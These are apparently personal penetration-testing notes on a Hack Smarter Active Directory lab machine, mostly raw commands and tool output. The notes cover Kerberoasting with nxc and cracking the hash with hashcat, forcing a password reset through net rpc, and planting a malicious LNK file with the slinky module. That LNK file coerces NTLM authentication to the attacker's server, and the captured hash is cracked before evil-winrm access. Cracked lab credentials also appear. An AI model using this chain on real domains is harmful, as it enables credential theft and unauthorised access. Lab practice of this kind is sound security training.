---
description: >-
  A short Harry Potter themed Active Directory Machine that is apart of the
  Bring The Pain lab by Hack Smarter. Note: These are notes, this is not a
  walk-through of this machine.
---

# Building Magic

R.Widdleton compromise

Credentials are valid with this user

R.Widdleton:lilRonRon

![image.png](attachment:50f0c8d6-51b9-46ad-8761-eb16e6e920ea:image.png)

creds are valid: r.widdleton:lilronron

everyother creds are not valid

has smb shares but they are not important.

user nxc smb -u:'user' -p:'pass' and then options

* Use BloodHound next-

Ingested the Data into BloodHound

R.widdleton does not have write access of AD objects and doesnt have any interesting access to other groups

potential attack path:

`1. R.Haggard: Change password of H.POTCH@buildingmagic.local`

Compromising R.Haggard

kerberaosted the user:r.haggard

![image.png](attachment:c33b08c0-1300-4b28-b57f-ef2b26ee2468:image.png)

Pasted image 20251108105609.png

Can change H.Potch's password via users.

if you can write to a file, it is always your next way forward.

netexc has a slinky module:

![image.png](attachment:fc51b10c-e95d-4303-aec6-83ecf001f69c:image.png)

Lets you create windows shortcuts with the icon attribute containing a URI to the specified server to the SMB shares.

grabbed H.Grangon's hash as a result.

![image.png](attachment:369c83d0-d657-418c-a349-ad3e11c4cb2b:image.png)

H.Grangon is a member of these groups.

Hashes that were given in the Scope:

c4a21c4d438819d73d24851e7966229c md5

61ee643c5043eadbcdc6c9d1e3ebd298 Unknown Not found.

8960516f904051176cc5ef67869de88f Unknown Not found.

bbd151e24516a48790b2cd5845e7f148 Unknown Not found.

4d14ff3e264f6a9891aa6cea1cfa17cb Unknown Not found.

078576a0569f4e0b758aedf650cb6d9a Unknown Not found.

eada74b2fa7f5e142ac412d767831b54 Unknown Not found.

dd4137bab3b52b55f99f18b7cd595448 Unknown Not found.

bfaf794a81438488e57ee3954c27cd75 md5 shadowhex7

47d23284395f618bea1959e710bc68ef Unknown

Cracked passwords:

r.widdleton:lilronron

t.ren:shadowhex7

Compromising R.Widdleton

V2\*GQjim)BCyY'v

### Getting Bloodhound Loot:

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --bloodhound --collection All --dns-server 10.1.66.82

SMB 10.1.66.82 445 DC01 \[\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)

LDAP 10.1.66.82 389 DC01 \[+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron

LDAP 10.1.66.82 389 DC01 Resolved collection methods: localadmin, dcom, container, group, objectprops, session, trusts, acl, psremote, rdp

LDAP 10.1.66.82 389 DC01 Done in 00M 10S

LDAP 10.1.66.82 389 DC01 Compressing output into /root/.nxc/logs/DC01\_10.1.66.82\_2025-11-08\_102451\_bloodhound.zip

└─# cp /root/.nxc/logs/DC01\_10.1.66.82\_2025-11-08\_102451\_bloodhound.zip .

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# nxc ldap dco1.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --kerberoast output.txt

^C^\[\[A^Z

zsh: suspended nxc ldap dco1.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --kerberoas

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --kerberoast output.txt

SMB 10.1.66.82 445 DC01 \[\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)

LDAP 10.1.66.82 389 DC01 \[+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron

LDAP 10.1.66.82 389 DC01 Bypassing disabled account krbtgt

LDAP 10.1.66.82 389 DC01 \[\*] Total of records returned 1

LDAP 10.1.66.82 389 DC01 sAMAccountName: r.haggard memberOf: pwdLastSet: 2025-05-15 17:09:04.002067 lastLogon:2025-05-15 18:34:51.644710

LDAP 10.1.66.82 389 DC01 krb5tgs$2&#x33;_&#x72;.haggardBUILDINGMAGIC.LOCALBUILDINGMAGIC.LOCAL/r.haggar&#x64;_&#x35;2898a96fb9874c842efe47745cbe11ef9352acb210a2ca9082331a6b8d152d56c34be95fc590965020ac7495bcbd47f55fb3712f0c5c3b732c22ab402d08e9e0d67c958949bbf7ee0aafd8bde85cdb2bee06999abd8162bb457c3959e1c7528b9f3bb83fd2332962dc7eb3e69320f460be96d011479d562f4ed370c9a8b14b27d4a6b579e7a996e65f613c7ad44d8e3ea3e518e5224c407302c9512fe4747c94a1e2aba82edb46dba2c1bda581b74b53ae61fd80db624bce8e03de415300be012302e772bab50a15007b64e03be78c973ff7c80590fbbba2f7401dfa84ba891decfa58b19560de9c4f67b1262621848c1ac6064c971ae183952368c4c68ef606b19973abb6f0fd799a7988ff5687ddb3c5f362abfc67a0a275e481e72226881efc8e2e51a4bbd72f23bf07860b19a3ae2ce0bbcae9a094678cbbd8fe9d7f77b1797cc8eebd3dabe9f29af34fa89aa501280f1def8238601eaea8415bf212d610f26c0aba773d9b8f91cb88d142fc5863f47162191c8918e00dcbf3d6ff83980786b083040c54a8963a0e3cb942012e74cc02400dddebecb5f29f13ac46f466a7c612543020bd62d802c8559e27793becaf9569ed1bcef12f0a621d6d0ccf884141f974f0171c60992351055841f4fdfc8503915d8933e9f8b2180cfcf9afa49d438046d9e592345fe50b4b04b8b025c6baf1420593561bfff51299db0a2c53636133841e1eb05f0d4c18bab43d621e91692dd7c285ee652495075be7c657d490d9e7a2f15a67e8e20c434e5843f6182fd2414aa0bfd806f0c9797ef55cd4eec6c4665be3d480edbb13065fec8d17778d41a9a06a59c7ac3f472e3531d2daa23c63b104dc33794635795813350196dcfd09172c922740f3c35796709a00c31668a8dea49a5c4353f3b592a3de806927da47632200278e76edfee627fd72786f1d9e061b64c4b9f0d4952295f06f737b797acf1246799e4b6f171ee1c194c5f805b839ff6e5ec2ea05595d195d9655b0c77ce8ba8888f13f9a6ff51d731757a1e4018525cde1ce3809a5d9552c74506d69520882cca42f7db412b6307412a0e9973e981b7c6640701025069d0a391af539a50b6450b5017982cc3f6b39cee22241d3d0c0f15d7c37ef7b42a0c5e6994bec347a7938b336226af2a763a86f943563d480a2cabc3a1b447d42e0fb76bb10086d17d54dda46280c10ce2e445bcf5fea5282124036d32947f1a5e8e8cd4e6ac58de7b692fa8f3320b3c2e4c796d0601435fb5099259423ccd95022d21f573e6532716cb79ece18e5e73e7739a3d9ed6f92e00c5ea10ddc66f805a99cc5986a177d15bfbcb2b38af06fd2a44a4680e35ea326dee38050387f59b78c5cfd4f57abd3cd7a0cde98602d385f126d2e7e9eac1f1b74e4a52bbcf26159e08778d732539527789d067fa19b8a864ff9b0814ba68832b610042b287c70f30e7c8d0750e4969904d419d28d232b8802c78ecd2b74191bf95946b07a5baa4dcae69cc47e556fe95a90c7cbc64a5013382860aee76daf994548208f022feb2e60d8655fb27f73999ef72be5e29e0aa205b73c55f

### COMPROMISING R.HAGGARD:

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt

hashcat (v7.1.2) starting

* Device #01: cpu-haswell-11th Gen Intel(R) Core(TM) i5-11400 @ 2.60GHz, 2171/4343 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0

Maximum password length supported by kernel: 256

Minimum salt length supported by kernel: 0

Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts

Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Rules: 1

Optimizers applied:

* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.

Pure kernels can crack longer passwords, but drastically reduce performance.

If you want to switch to optimized kernels, append -O to your commandline.

See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (1730 MB free)

Dictionary cache hit:

* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

krb5tgs$2&#x33;_&#x72;.haggardBUILDINGMAGIC.LOCALBUILDINGMAGIC.LOCAL/r.haggar&#x64;_&#x35;2898a96fb9874c842efe47745cbe11ef9352acb210a2ca9082331a6b8d152d56c34be95fc590965020ac7495bcbd47f55fb3712f0c5c3b732c22ab402d08e9e0d67c958949bbf7ee0aafd8bde85cdb2bee06999abd8162bb457c3959e1c7528b9f3bb83fd2332962dc7eb3e69320f460be96d011479d562f4ed370c9a8b14b27d4a6b579e7a996e65f613c7ad44d8e3ea3e518e5224c407302c9512fe4747c94a1e2aba82edb46dba2c1bda581b74b53ae61fd80db624bce8e03de415300be012302e772bab50a15007b64e03be78c973ff7c80590fbbba2f7401dfa84ba891decfa58b19560de9c4f67b1262621848c1ac6064c971ae183952368c4c68ef606b19973abb6f0fd799a7988ff5687ddb3c5f362abfc67a0a275e481e72226881efc8e2e51a4bbd72f23bf07860b19a3ae2ce0bbcae9a094678cbbd8fe9d7f77b1797cc8eebd3dabe9f29af34fa89aa501280f1def8238601eaea8415bf212d610f26c0aba773d9b8f91cb88d142fc5863f47162191c8918e00dcbf3d6ff83980786b083040c54a8963a0e3cb942012e74cc02400dddebecb5f29f13ac46f466a7c612543020bd62d802c8559e27793becaf9569ed1bcef12f0a621d6d0ccf884141f974f0171c60992351055841f4fdfc8503915d8933e9f8b2180cfcf9afa49d438046d9e592345fe50b4b04b8b025c6baf1420593561bfff51299db0a2c53636133841e1eb05f0d4c18bab43d621e91692dd7c285ee652495075be7c657d490d9e7a2f15a67e8e20c434e5843f6182fd2414aa0bfd806f0c9797ef55cd4eec6c4665be3d480edbb13065fec8d17778d41a9a06a59c7ac3f472e3531d2daa23c63b104dc33794635795813350196dcfd09172c922740f3c35796709a00c31668a8dea49a5c4353f3b592a3de806927da47632200278e76edfee627fd72786f1d9e061b64c4b9f0d4952295f06f737b797acf1246799e4b6f171ee1c194c5f805b839ff6e5ec2ea05595d195d9655b0c77ce8ba8888f13f9a6ff51d731757a1e4018525cde1ce3809a5d9552c74506d69520882cca42f7db412b6307412a0e9973e981b7c6640701025069d0a391af539a50b6450b5017982cc3f6b39cee22241d3d0c0f15d7c37ef7b42a0c5e6994bec347a7938b336226af2a763a86f943563d480a2cabc3a1b447d42e0fb76bb10086d17d54dda46280c10ce2e445bcf5fea5282124036d32947f1a5e8e8cd4e6ac58de7b692fa8f3320b3c2e4c796d0601435fb5099259423ccd95022d21f573e6532716cb79ece18e5e73e7739a3d9ed6f92e00c5ea10ddc66f805a99cc5986a177d15bfbcb2b38af06fd2a44a4680e35ea326dee38050387f59b78c5cfd4f57abd3cd7a0cde98602d385f126d2e7e9eac1f1b74e4a52bbcf26159e08778d732539527789d067fa19b8a864ff9b0814ba68832b610042b287c70f30e7c8d0750e4969904d419d28d232b8802c78ecd2b74191bf95946b07a5baa4dcae69cc47e556fe95a90c7cbc64a5013382860aee76daf994548208f022feb2e60d8655fb27f73999ef72be5e29e0aa205b73c55f:rubeushagrid

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)

Hash.Target......: krb5tgs$2&#x33;_&#x72;.haggardBUILDINGMAGIC.LOCALBUILDING...73c55f Time.Started.....: Sat Nov 8 10:44:00 2025 (3 secs) Time.Estimated...: Sat Nov 8 10:44:03 2025 (0 secs) Kernel.Feature...: Pure Kernel (password length 0-256 bytes) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#01........: 1094.5 kH/s (1.61ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 4132864/14344385 (28.81%) Rejected.........: 0/4132864 (0.00%) Restore.Point....: 4130816/14344385 (28.80%) Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#01...: ruby1326_ -> ruben53 Hardware.Mon.#01.: Util: 92%

Started: Sat Nov 8 10:43:45 2025

Stopped: Sat Nov 8 10:44:05 2025

nxc smb buildingmagic.local -u 'r.haggrid' -p 'rubeushagrid' --shares

SMB 10.1.66.82 445 DC01 \[\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)

SMB 10.1.66.82 445 DC01 \[-] BUILDINGMAGIC.LOCAL\r.haggrid:rubeushagrid STATUS\_LOGON\_FAILURE

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# nxc smb buildingmagic.local -u 'r.haggrad' -p 'rubeushagrid' --shares

SMB 10.1.66.82 445 DC01 \[\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)

SMB 10.1.66.82 445 DC01 \[-] BUILDINGMAGIC.LOCAL\r.haggrad:rubeushagrid STATUS\_LOGON\_FAILURE

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# nxc smb buildingmagic.local -u 'r.haggrad' -p 'rubeushagrid' --shares

SMB 10.1.66.82 445 DC01 \[\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)

SMB 10.1.66.82 445 DC01 \[-] BUILDINGMAGIC.LOCAL\r.haggrad:rubeushagrid STATUS\_LOGON\_FAILURE

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# nxc smb dc01.buildingmagic.local -u 'r.haggard' -p 'rubeushagrid' --shares

SMB 10.1.66.82 445 DC01 \[\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)

SMB 10.1.66.82 445 DC01 \[+] BUILDINGMAGIC.LOCAL\r.haggard:rubeushagrid

SMB 10.1.66.82 445 DC01 \[\*] Enumerated shares

SMB 10.1.66.82 445 DC01 Share Permissions Remark

SMB 10.1.66.82 445 DC01 ----- ----------- ------

SMB 10.1.66.82 445 DC01 ADMIN$ Remote Admin

SMB 10.1.66.82 445 DC01 C$ Default share

SMB 10.1.66.82 445 DC01 File-Share Central Repository of Building Magic's files.

SMB 10.1.66.82 445 DC01 IPC$ READ Remote IPC

SMB 10.1.66.82 445 DC01 NETLOGON READ Logon server share

SMB 10.1.66.82 445 DC01 SYSVOL READ Logon server share

### COMPROMISING H.POTCH:

```
                        net rpc password "h.potch" "password" -U "buildingmagic.local"/"r.haggard"%"rubeushagrid" -S "10.1.66.82"
```

Node Type:

User

Display Name:

Henry Potch

Object ID:

S-1-5-21-934388623-3731635803-3176817623-1104

Admin Count:

FALSE

Allows Unconstrained Delegation:

FALSE

Created:

2025-05-15 16:56 EDT (GMT-0400)

Distinguished Name:

CN=HENRY POTCH,CN=USERS,DC=BUILDINGMAGIC,DC=LOCAL

Do Not Require Pre-Authentication:

FALSE

Domain FQDN:

BUILDINGMAGIC.LOCAL

Domain SID:

S-1-5-21-934388623-3731635803-3176817623

Enabled:

TRUE

Last Collected by BloodHound:

2025-11-09T16:17:25.517709648Z

Last Logon (Replicated):

2025-09-02 23:39 EDT (GMT-0400)

Last Logon:

2025-09-02 23:39 EDT (GMT-0400)

Last Seen by BloodHound:

2025-11-09 11:17 EST (GMT-0500)

Marked Sensitive:

FALSE

Owner SID:

S-1-5-21-934388623-3731635803-3176817623-512

Password Last Set:

2025-09-02 13:56 EDT (GMT-0400)

Password Never Expires:

TRUE

Password Not Required:

FALSE

SAM Account Name:

h.potch

Trusted For Constrained Delegation:

hpotch:password

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# net rpc password "h.potch" 'password' -U "buildingmagic.local"/"r.haggard"%"rubeushagrid" -S "10.1.66.82"

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

nxc smb dc01.buildingmagic.local -u H.Potch -p password -M slinky -O server=10.200.18.222 shares='FileShare' name='Hacksmarter\\

writing link files into SMB shares with nxc:

nxc smb dc01.buildingmagic.local -u h.potch -p password -M slinky -o server=10.200.18.222 shares='FileShare' name='Hacksmarter'

### COMPROMISING H.GRANGON:

h.grangon:magic4ever

Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.

net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"

It can also be done with pass-the-hash using pth-toolkit's net tool. If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.

pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"

Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# nxc smb dc01.buildingmagic.local -u h.potch -p password -M slinky -o server=10.200.18.222 shares='File-Share' name='Hacksmarter'

\[\*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded

SMB 10.1.66.82 445 DC01 \[\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)

SMB 10.1.66.82 445 DC01 \[+] BUILDINGMAGIC.LOCAL\h.potch:password

SMB 10.1.66.82 445 DC01 \[\*] Enumerated shares

SMB 10.1.66.82 445 DC01 Share Permissions Remark

SMB 10.1.66.82 445 DC01 ----- ----------- ------

SMB 10.1.66.82 445 DC01 ADMIN$ Remote Admin

SMB 10.1.66.82 445 DC01 C$ Default share

SMB 10.1.66.82 445 DC01 File-Share READ,WRITE Central Repository of Building Magic's files.

SMB 10.1.66.82 445 DC01 IPC$ READ Remote IPC

SMB 10.1.66.82 445 DC01 NETLOGON READ Logon server share

SMB 10.1.66.82 445 DC01 SYSVOL READ Logon server share

SLINKY 10.1.66.82 445 DC01 \[+] Found writable share: File-Share

SLINKY 10.1.66.82 445 DC01 \[+] Created LNK file on the File-Share share

\[SMB] NTLMv2-SSP Client : 10.1.66.82

\[SMB] NTLMv2-SSP Username : BUILDINGMAGIC\h.grangon

\[SMB] NTLMv2-SSP Hash : h.grangon::BUILDINGMAGIC:764bec4892b6c40e:FC4934220B0BC4E97AB631108E468277:010100000000000080F3CB8F6F51DC0192E373BC65BB90D300000000020008005A004B004400560001001E00570049004E002D003100430052004F00530033003800430057004A00470004003400570049004E002D003100430052004F00530033003800430057004A0047002E005A004B00440056002E004C004F00430041004C00030014005A004B00440056002E004C004F00430041004C00050014005A004B00440056002E004C004F00430041004C000700080080F3CB8F6F51DC010600040002000000080030003000000000000000000000000040000017CD6553267AA07E32FC3AA665A83E1B007AD7D7C0684769B6364C7837EB43100A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00310038002E003200320032000000000000000000

\[\*] Skipping previously captured hash for BUILDINGMAGIC\h.grangon

\[\*] Skipping previously captured hash for BUILDINGMAGIC\h.grangon

┌──(root㉿kali)-\[\~/Desktop/BuildingMagic]

└─# hashcat grangon-hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v7.1.2) starting in autodetect mode

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.

The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!

Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0

Maximum password length supported by kernel: 256

Minimum salt length supported by kernel: 0

Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts

Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Rules: 1

Optimizers applied:

* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.

Pure kernels can crack longer passwords, but drastically reduce performance.

If you want to switch to optimized kernels, append -O to your commandline.

See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (1463 MB free)

Dictionary cache hit:

* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

H.GRANGON::BUILDINGMAGIC:764bec4892b6c40e:fc4934220b0bc4e97ab631108e468277:010100000000000080f3cb8f6f51dc0192e373bc65bb90d300000000020008005a004b004400560001001e00570049004e002d003100430052004f00530033003800430057004a00470004003400570049004e002d003100430052004f00530033003800430057004a0047002e005a004b00440056002e004c004f00430041004c00030014005a004b00440056002e004c004f00430041004c00050014005a004b00440056002e004c004f00430041004c000700080080f3cb8f6f51dc010600040002000000080030003000000000000000000000000040000017cd6553267aa07e32fc3aa665a83e1b007ad7d7c0684769b6364c7837eb43100a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00310038002e003200320032000000000000000000:magic4ever

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 5600 (NetNTLMv2)

Hash.Target......: H.GRANGON::BUILDINGMAGIC:764bec4892b6c40e:fc4934220...000000

Time.Started.....: Sun Nov 9 12:14:23 2025 (4 secs)

Time.Estimated...: Sun Nov 9 12:14:27 2025 (0 secs)

Kernel.Feature...: Pure Kernel (password length 0-256 bytes)

Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#01........: 401.0 kH/s (4.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:8

Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 1540096/14344385 (10.74%)

Rejected.........: 0/1540096 (0.00%)

Restore.Point....: 1538048/14344385 (10.72%)

Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#01...: magnificientsvn -> madknowles

Hardware.Mon.#01.: Util: 93%

Started: Sun Nov 9 12:14:06 2025

Stopped: Sun Nov 9 12:14:27 2025

Try: └─# evil-winrm -i 10.1.66.82 -u h.grangon -p magic4ever

![image.png](attachment:029b4e18-9de9-40d5-acb4-f68a9b612db4:image.png)

Changed Ruby gems version from 2.7 to 2.0

Works.

![image.png](attachment:e1516367-9f47-48de-94c4-e25c5f6848a2:image.png)

![image.png](attachment:ee792dbb-894d-4f83-80b1-a23ab19e9b21:image.png)

Compromised a.flatch

Root.txt

![image.png](attachment:742c241e-c0c7-4fe6-8bb1-c2356b3eb456:image.png)
